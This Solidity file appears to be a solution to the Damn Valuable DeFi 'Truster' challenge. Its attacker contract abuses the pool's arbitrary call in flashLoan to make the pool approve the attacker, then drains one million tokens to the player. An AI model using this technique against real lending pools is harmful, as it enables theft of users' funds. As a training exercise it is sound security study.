// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    uint256 public constant VICTIM_BALANCE = 1_000_000 ether;

    function attack(DamnValuableToken token, TrusterLenderPool pool, address player) external {
        bytes memory maliciousPayload =
            abi.encodeWithSignature("approve(address,uint256)", address(this), VICTIM_BALANCE);
        pool.flashLoan(0, address(this), address(token), maliciousPayload);
        token.transferFrom(address(pool), address(player), VICTIM_BALANCE);
    }
}
